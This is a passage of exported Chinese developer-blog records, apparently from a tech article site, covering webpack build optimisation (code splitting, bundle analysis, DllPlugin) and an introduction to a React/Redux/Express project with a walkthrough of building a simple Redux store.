class=\"hljs-keyword\"\u003edefault\u003c/span\u003e [{\n    \u003cspan class=\"hljs-attr\"\u003epath\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e,\n    \u003cspan class=\"hljs-attr\"\u003ecomponent\u003c/span\u003e: Layout,\n    \u003cspan class=\"hljs-attr\"\u003echildren\u003c/span\u003e: [{\n        \u003cspan class=\"hljs-attr\"\u003epath\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e,\n\u0009\u0009\u003cspan class=\"hljs-attr\"\u003ecomponent\u003c/span\u003e: Home\n    }]\n}]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e可以看到require.ensure有三个参数\u003cbr\u003e\n第一个参数的作用是配置依赖列表，被依赖的模块会和当前模块打包到一起；\n第二个参数是一个函数，将要单独打包的模块传入回调里；\n第三个参数是chunkname，可用来配置js的文件名；\n配置完了以后，当我们加载这个页面的时候，属于每个页面自己的代码部分，就会单独去加载了。\u003c/p\u003e\n\u003ch5 class=\"heading\"\u003e3.webpack-bundle-analyzer\u003c/h5\u003e\n\u003cp\u003e这是一个webpack的插件，它的主要作用是用来分析我们模块打包的资源情况，非常的直观，也非常的实用，下面我们先看下它的效果图：\n\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/12/31/160aadcbfbd67a3b?w=908\u0026amp;h=547\u0026amp;f=gif\u0026amp;s=3663774\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n那么该如何配置呢？\n首先你得先install，然后配置如下：\u003cp\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e BundleAnalyzerPlugin = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'webpack-bundle-analyzer'\u003c/span\u003e).BundleAnalyzerPlugin;\nplugins = [\n    \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e BundleAnalyzerPlugin({\n\u0009  \u0009\u003cspan class=\"hljs-comment\"\u003e// Can be `server`, `static` or `disabled`.\u003c/span\u003e\n\u0009  \u0009\u003cspan class=\"hljs-comment\"\u003e// In `server` mode analyzer will start HTTP server to show bundle report.\u003c/span\u003e\n\u0009  \u0009\u003cspan class=\"hljs-comment\"\u003e// In `static` mode single HTML file with bundle report will be generated.\u003c/span\u003e\n\u0009  \u0009\u003cspan class=\"hljs-comment\"\u003e// In `disabled` mode you can use this plugin to just generate Webpack Stats JSON file by setting `generateStatsFile` to `true`.\u003c/span\u003e\n\u0009  \u0009analyzerMode: \u003cspan class=\"hljs-string\"\u003e'server'\u003c/span\u003e,\n\u0009  \u0009\u003cspan class=\"hljs-comment\"\u003e// Host that will be used in `server` mode to start HTTP server.\u003c/span\u003e\n\u0009  \u0009analyzerHost: \u003cspan class=\"hljs-string\"\u003e'127.0.0.1'\u003c/span\u003e,\n\u0009  \u0009\u003cspan class=\"hljs-comment\"\u003e// Port that will be used in `server` mode to start HTTP server.\u003c/span\u003e\n\u0009  \u0009analyzerPort: \u003cspan class=\"hljs-number\"\u003e8888\u003c/span\u003e,\n\u0009  \u0009\u003cspan class=\"hljs-comment\"\u003e// Path to bundle report file that will be generated in `static` mode.\u003c/span\u003e\n\u0009  \u0009\u003cspan class=\"hljs-comment\"\u003e// Relative to bundles output directory.\u003c/span\u003e\n\u0009  \u0009reportFilename: \u003cspan class=\"hljs-string\"\u003e'report.html'\u003c/span\u003e,\n\u0009  \u0009\u003cspan class=\"hljs-comment\"\u003e// Module sizes to show in report by default.\u003c/span\u003e\n\u0009  \u0009\u003cspan class=\"hljs-comment\"\u003e// Should be one of `stat`, `parsed` or `gzip`.\u003c/span\u003e\n\u0009  \u0009\u003cspan class=\"hljs-comment\"\u003e// See \"Definitions\" section for more information.\u003c/span\u003e\n\u0009  \u0009defaultSizes: \u003cspan class=\"hljs-string\"\u003e'parsed'\u003c/span\u003e,\n\u0009  \u0009\u003cspan class=\"hljs-comment\"\u003e// Automatically open report in default browser\u003c/span\u003e\n\u0009  \u0009openAnalyzer: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n\u0009  \u0009\u003cspan class=\"hljs-comment\"\u003e// If `true`, Webpack Stats JSON file will be generated in bundles output directory\u003c/span\u003e\n\u0009  \u0009generateStatsFile: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\n\u0009  \u0009\u003cspan class=\"hljs-comment\"\u003e// Name of Webpack Stats JSON file that will be generated if `generateStatsFile` is `true`.\u003c/span\u003e\n\u0009  \u0009\u003cspan class=\"hljs-comment\"\u003e// Relative to bundles output directory.\u003c/span\u003e\n\u0009  \u0009statsFilename: \u003cspan class=\"hljs-string\"\u003e'stats.json'\u003c/span\u003e,\n\u0009  \u0009\u003cspan class=\"hljs-comment\"\u003e// Options for `stats.toJson()` method.\u003c/span\u003e\n\u0009  \u0009\u003cspan class=\"hljs-comment\"\u003e// For example you can exclude sources of your modules from stats file with `source: false` option.\u003c/span\u003e\n\u0009  \u0009\u003cspan class=\"hljs-comment\"\u003e// See more options here: https://github.com/webpack/webpack/blob/webpack-1/lib/Stats.js#L21\u003c/span\u003e\n\u0009  \u0009statsOptions: \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e,\n\u0009  \u0009\u003cspan class=\"hljs-comment\"\u003e// Log level. Can be 'info', 'warn', 'error' or 'silent'.\u003c/span\u003e\n\u0009  \u0009logLevel: \u003cspan class=\"hljs-string\"\u003e'info'\u003c/span\u003e\n\u0009})\n]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e是不是很简单却很实用呢~\u003c/p\u003e\n\u003ch5 class=\"heading\"\u003e4.DllPlugin+DllReferencePlugin\u003c/h5\u003e\n\u003cp\u003e在使用webpack开发的过程中，相信很多人都会觉得有时候项目启动编译时间等待太久了，为什么呢？因为当项目慢慢庞大起来的时候，我们依赖的模块越来越多，每次项目启动编译都需要全部编译打包，所以自然会导致编译时间偏长，那如何解决这个问题呢？\u003cbr\u003e\n首先思路是这样的，一般node_modules文件中的依赖，基本上是不会去做改变的，所以没有必要每次都去进行打包，我们完全可以将这些依赖提前打包好，然后就可以一直使用了。\u003cbr\u003e\nDllPlugin就是用来提前打包我们的依赖包的插件。DllPlugin分为两个插件，一个是DllPlugin，另一个是DllReferencePlugin。\u003c/p\u003e\n\u003ch6 class=\"heading\"\u003e首先DllPlugin的作用是用来提前打包好依赖，步骤如下：\u003c/h6\u003e\n\u003col\u003e\n\u003cli\u003e新建一个vendor.js，用来引入所有我们依赖的模块：\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e Vue \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'vue'\u003c/span\u003e;\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e ElementUI \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'element-ui'\u003c/span\u003e;\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e VouRouter \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'vue-router'\u003c/span\u003e;\n\u003c/code\u003e\u003c/pre\u003e\u003col start=\"2\"\u003e\n\u003cli\u003e新建一个webpack.config.dll.js的配置文件，配置如下：\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e path = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'path'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e webpack = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'webpack'\u003c/span\u003e);\n\n\u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports = {\n    \u003cspan class=\"hljs-attr\"\u003eentry\u003c/span\u003e: {\n        \u003cspan class=\"hljs-attr\"\u003evendor\u003c/span\u003e: [path.resolve(__dirname, \u003cspan class=\"hljs-string\"\u003e'vendor'\u003c/span\u003e)]\n    },\n    \u003cspan class=\"hljs-attr\"\u003eoutput\u003c/span\u003e: {\n        \u003cspan class=\"hljs-attr\"\u003epath\u003c/span\u003e: path.resolve(__dirname, \u003cspan class=\"hljs-string\"\u003e'./dll'\u003c/span\u003e),\n\u0009\u0009\u003cspan class=\"hljs-attr\"\u003efilename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'dll.[name].js'\u003c/span\u003e,\n\u0009\u0009\u003cspan class=\"hljs-attr\"\u003elibrary\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'[name]'\u003c/span\u003e\n    },\n    \u003cspan class=\"hljs-attr\"\u003eplugins\u003c/span\u003e: [\n\u0009\u0009\u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e webpack.DllPlugin({\n\u0009\u0009\u0009\u003cspan class=\"hljs-attr\"\u003epath\u003c/span\u003e: path.join(__dirname, \u003cspan class=\"hljs-string\"\u003e\"./dll\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"[name]-manifest.json\"\u003c/span\u003e),\n\u0009\u0009\u0009\u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"[name]\"\u003c/span\u003e\n\u0009\u0009})\n\u0009],\n\u0009\u003cspan class=\"hljs-attr\"\u003eresolve\u003c/span\u003e: {\n\u0009\u0009\u003cspan class=\"hljs-attr\"\u003eextensions\u003c/span\u003e: [\u003cspan class=\"hljs-string\"\u003e'js'\u003c/span\u003e]\n\u0009}\n\u003c/code\u003e\u003c/pre\u003e\u003col start=\"3\"\u003e\n\u003cli\u003e配置好了以后，就可以到终端里运行webpack --config webpack.config.dll.js了，然后就能在你的dist/dll目录下看到一个dll.vendore.js和一个vendor-manifest.json文件，到此DllPlugin提取依赖的作用就完成了。\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch6 class=\"heading\"\u003e下面是DllReferencePlugin的配置，这个配置更简单，找到项目原本的webpack.config.js文件，然后配置如下：\u003c/h6\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports = {\n    \u003cspan class=\"hljs-attr\"\u003eplugins\u003c/span\u003e: [\n        \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e webpack.DllReferencePlugin({\n            \u003cspan class=\"hljs-attr\"\u003econtext\u003c/span\u003e: path.join(__dirname, \u003cspan class=\"hljs-string\"\u003e\"src\"\u003c/span\u003e),\n            \u003cspan class=\"hljs-attr\"\u003emanifest\u003c/span\u003e: \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"./dll/vendor-manifest.json\"\u003c/span\u003e)\n        })\n    ]\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这样就都配置好了，但是这样做还存在个问题，当你运行项目时，会提示：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003eYou are using the runtime-only build \u003cspan class=\"hljs-keyword\"\u003eof\u003c/span\u003e Vue...\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e大概的意思就是说因为你使用了vue的template，使用的vue版本不对，所以我在webpack.config.dll.js里面对vue做如下设置：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003ealias: {\n\u0009\u003cspan class=\"hljs-string\"\u003e'vue$'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'vue/dist/vue.common.js'\u003c/span\u003e\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e否则会默认打包vue.runtime.common.js，正确的应该是打包vue.common.js这个文件。做了以上配置以后，本以为就OK了，但还是太天真，依旧还是报了一样的错误。\u003cbr\u003e\n然后我到webpack.config.js里面做了同样的配置，结果就OK了。但是这会导致vue被打包了两份，所以暂时只能放弃在vendor内引入vue了，导致该问题的原因暂不明了。欢迎大家找到原因后分享一下~\u003c/p\u003e\n","buildTime":"1514894425.3103","__v":0}
{"_id":{"$oid":"5a4b76348b69bb25d83da3df"},"id":"5a490d8051882511793e8a5f","author":{"$oid":"5a4b76338b69bb25d83da3d1"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2018/1/1/160ad5cb130a8bb4?w=613\u0026h=575\u0026f=gif\u0026s=319756"],"screenShot":null}],"title":"送给前端开发者的一份新年礼物","meta":{"likeCount":0},"tag":["React.js","MongoDB","JavaScript","Express"],"comment":[],"shortContent":"从2018年1月开始，每周都会更新 2 小时左右的教学视频，视频会按照以上大纲教学，这个视频是完全免费的，保证更新完成。 想第一时间获得更新的视频，可以扫码加群。(二维码在文章最后，你可以先将项目总结看一遍，有兴趣再加不迟) React 其实只是一个 UI 框架，频繁进行 DO…","content":"\u003cblockquote\u003e\n\u003cp\u003e大家好，新年快乐！今天，我开源了一个 \u003ca target=\"_blank\" href=\"https://github.com/KieSun/Chat-Buy-React\"\u003eReact 的项目\u003c/a\u003e。这个项目虽小，但是五脏六腑俱全，并且接下来我会根据该项目做一整套的免费视频，预计总时间在 20 小时以上。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e先来介绍下这个项目的技术栈：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eReact 全家桶：React 16 + Redux + React-router 4.0 + Immutable.js\u003c/li\u003e\n\u003cli\u003eES6 + ES7 语法\u003c/li\u003e\n\u003cli\u003e网络请求：Axios + Socket.io\u003c/li\u003e\n\u003cli\u003eUI 框架：Antd-mobile\u003c/li\u003e\n\u003cli\u003e后端：Express + MongoDB\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e接下来是我初步拟订的课程大纲规划\n\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"课程大纲\" src=\"https://user-gold-cdn.xitu.io/2017/12/31/160ab7a0feddd5c7?w=925\u0026amp;h=648\u0026amp;f=png\u0026amp;s=184587\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e从2018年1月开始，每周都会更新 2 小时左右的教学视频，视频会按照以上大纲教学，这个视频是完全免费的，保证更新完成。\u003c/p\u003e\n\u003cp\u003e想第一时间获得更新的视频，可以扫码加群。(二维码在文章最后，你可以先将项目总结看一遍，有兴趣再加不迟)\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e项目总结\u003c/h3\u003e\n\u003ch4 class=\"heading\"\u003eReact 是什么\u003c/h4\u003e\n\u003cp\u003eReact 其实只是一个 UI 框架，频繁进行 DOM 操作的代价是很昂贵的，所以 React 使用了虚拟 DOM 的技术，每当状态发生改变，就会生成新的虚拟 DOM 并与原本的进行改变，让变化的地方去渲染。并且为了性能的考虑，只对状态进行浅比较（这是一个很大的优化点）。\u003c/p\u003e\n\u003cp\u003eReact 已经成为当今最流行的框架之一，但是他的学习成本并不低并且需要你有一个良好的 JS 基础。由于React 只是一个 UI 框架，所以你想完成一个项目，你就得使用他的全家桶，更加提高了一个学习成本。所以本课程也是针对初学者，让初学者能够快速的上手 React 。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003eReact 组件\u003c/h4\u003e\n\u003cp\u003e如何写好规划好一个组件决定了你的 React 玩的溜不溜。一个组件你需要考虑他提供几个对外暴露的接口，内部状态通过局部状态改变还是全局状态改变好。并且你的组件应该是利于复用和维护的。\u003c/p\u003e\n\u003ch5 class=\"heading\"\u003e组件的生命周期\u003c/h5\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"生命周期\" src=\"https://user-gold-cdn.xitu.io/2018/1/1/160ad5cb4105eaeb?w=2803\u0026amp;h=2945\u0026amp;f=png\u0026amp;s=61370\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003erender\u003c/code\u003e 函数会在 UI 渲染时调用，你多次渲染就会多次调用，所以控制一个组件的重复渲染对于性能优化很重要\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ecomponentDidMount\u003c/code\u003e 函数只会在组件渲染以后调用一次，通常会在这个发起数据请求\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eshouldComponentUpdate\u003c/code\u003e 是一个很重要的函数，他的返回值决定了是否需要生成一个新的虚拟 DOM 去和之前的比较。通常遇到的性能问题你可以在这里得到很好的解决\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ecomponentWillMount\u003c/code\u003e 函数会在组件即将销毁时调用，项目中在清除聊天未读消息中用到了这个函数\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 class=\"heading\"\u003e父子组件参数传递\u003c/h5\u003e\n\u003cp\u003e在项目中我使用的方式是单个模块顶层父组件通过 \u003ccode\u003econnect\u003c/code\u003e 与 Redux 通信。子组件通过参数传递的方式获取需要的参数，对于参数类型我们应该规则好，便于后期 debug。\u003c/p\u003e\n\u003cp\u003e性能上考虑，我们在参数传递的过程中尽量只传递必须的参数。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e路由\u003c/h4\u003e\n\u003cp\u003e在 React-router 4.0 版本，官方也选择了组件的方式去书写路由。\u003c/p\u003e\n\u003cp\u003e下面介绍一下项目中使用到的按需加载路由高阶组件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e React, { Component } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"react\"\u003c/span\u003e;\n\u003cspan class=\"hljs-comment\"\u003e// 其实高阶组件就是一个组件通过参数传递的方式生成新的组件\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003easyncComponent\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eimportComponent\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eAsyncComponent\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eextends\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eComponent\u003c/span\u003e \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003econstructor\u003c/span\u003e(props) {\n      \u003cspan class=\"hljs-keyword\"\u003esuper\u003c/span\u003e(props);\n        \u003cspan class=\"hljs-comment\"\u003e// 存储组件\u003c/span\u003e\n      \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.state = {\n        \u003cspan class=\"hljs-attr\"\u003ecomponent\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e\n      };\n    }\n\n    \u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e componentDidMount() {\n    \u003cspan class=\"hljs-comment\"\u003e// 引入组件是需要下载文件的，所以是个异步操作\u003c/span\u003e\n      \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e { \u003cspan class=\"hljs-attr\"\u003edefault\u003c/span\u003e: component } = \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e importComponent();\n\n      \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.setState({\n        \u003cspan class=\"hljs-attr\"\u003ecomponent\u003c/span\u003e: component\n      });\n    }\n    \u003cspan class=\"hljs-comment\"\u003e// 渲染时候判断文件下完没有，下完了就渲染出来\u003c/span\u003e\n    render() {\n      \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e C = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.state.component;\n\n      \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e C ? \u003cspan class=\"xml\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eC\u003c/span\u003e {\u003cspan class=\"hljs-attr\"\u003e...this.props\u003c/span\u003e} /\u0026gt;\u003c/span\u003e : null;\n    }\n  }\n\n  return AsyncComponent;\n}\n\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003eRedux\u003c/h4\u003e\n\u003cp\u003eRedux 通常是个另新手困惑的点。首先，不是每个项目都需要使用 Redux，组件间通信不多，逻辑不复杂，你也就不需要使用这个库，毕竟这个使用这个库的开发成本很大。\u003c/p\u003e\n\u003cp\u003eRedux 是与 React 解耦的，所以你想和 Redux 通信就需要使用 React-redux，你在 action 中使用异步请求就得使用 Redux-thunk，因为 action 只支持同步操作。\u003c/p\u003e\n\u003ch5 class=\"heading\"\u003eRedux 的组成\u003c/h5\u003e\n\u003cp\u003eRedux 由三部分组成：action，store，reducer。\u003c/p\u003e\n\u003cp\u003eAction 顾名思义，就是你发起一个操作，具体使用如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003egetOrderSuccess\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003edata\u003c/span\u003e) \u003c/span\u003e{\n\u003cspan class=\"hljs-comment\"\u003e// 返回的就是一个 action，除了第一个参数一般这样写，其余的参数名随意\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e { \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e: GET_ORDER_SUCCESS, \u003cspan class=\"hljs-attr\"\u003epayload\u003c/span\u003e: data };\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eAction 发出去以后，会丢给 Reducer。Reducer 是一个纯函数（不依赖于且不改变它作用域之外的变量状态的函数），他接收一个之前的 state 和 action 参数，然后返回一个新的 state 给 store。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003estate = initialState, action\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003eswitch\u003c/span\u003e (action.type) {\n    \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e GET_ALL_ORDERS:\n      \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e state.set(\u003cspan class=\"hljs-string\"\u003e\"allOrders\"\u003c/span\u003e, action.payload);\n    \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e:\n      \u003cspan class=\"hljs-keyword\"\u003ebreak\u003c/span\u003e;\n  }\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e state;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eStore 很容易和 state 混淆。你可以把 Store 看成一个容器，state 存储在这个容器中。Store 提供一些 API 让你可以对 state 进行访问，改变等等。\u003c/p\u003e\n\u003cp\u003ePS：state 只允许在 reducer 中进行改变。\u003c/p\u003e\n\u003cp\u003e说明完了这些基本概念，我觉得是时候对 Redux 进行一点深入的挖掘。\u003c/p\u003e\n\u003ch5 class=\"heading\"\u003e自己实现 Redux\u003c/h5\u003e\n\u003cp\u003e之前说过 Store 是个容器，那么可以写下如下代码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eStore\u003c/span\u003e \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003econstructor\u003c/span\u003e() {}\n    \n    \u003cspan class=\"hljs-comment\"\u003e// 以下两个都是 store 的常用 API\u003c/span\u003e\n  dispatch() {}\n\n  subscribe() {}\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eStore 容纳了 state，并且能随时访问 state 的值，那么可以写下如下代码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eStore\u003c/span\u003e \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003econstructor\u003c/span\u003e(initState) {\n  \u003cspan class=\"hljs-comment\"\u003e// _ 代表私有，当然不是真的私有，便于教学就这样写了\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e._state = initState\n  }\n  \n  getState() {\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e._state\n  }\n    \n    \u003cspan class=\"hljs-comment\"\u003e// 以下两个都是 store 的常用 API\u003c/span\u003e\n  dispatch() {}\n\n  subscribe() {}\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e接下来我们考虑 dispatch 逻辑。首先 dispatch 应该接收一个 action 参数，并且发送给 reducer 更新 state。然后如果用户 subscribe 了 state，我们还应该调用函数，那么可以写下如下代码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003edispatch(action) {\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e._state = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.reducer(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.state, action)\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.subscribers.forEach(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003efn\u003c/span\u003e =\u0026gt;\u003c/span\u003e fn(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.getState()))\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003ereducer 逻辑很简单，在 constructor 时将 reducer 保存起来即可，那么可以写下如下代码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003econstructor\u003c/span\u003e(initState, reducer) {\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e._state = initState\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e._reducer = reducer\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e现在一个 Redux 的简易半成品已经完成了，我们可以来执行下以下代码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e initState = {\u003cspan class=\"hljs-attr\"\u003evalue\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e}\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003ereducer\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003estate = initState, action\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003eswitch\u003c/span\u003e (action.type) {\n        \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'increase'\u003c/span\u003e:\n            \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e {...state, \u003cspan class=\"hljs-attr\"\u003evalue\u003c/span\u003e: state.value + \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e}\n        \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'decrease'\u003c/span\u003e: {\n            \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e {...state, \u003cspan class=\"hljs-attr\"\u003evalue\u003c/span\u003e: state.value - \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e}\n        }\n    }\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e state\n}\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e store = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Store(initState, reducer)\nstore.dispatch({\u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'increase'\u003c/span\u003e})\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(store.getState()); \u003cspan class=\"hljs-comment\"\u003e// -\u0026gt; 1\u003c/span\u003e\nstore.dispatch({\u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e: 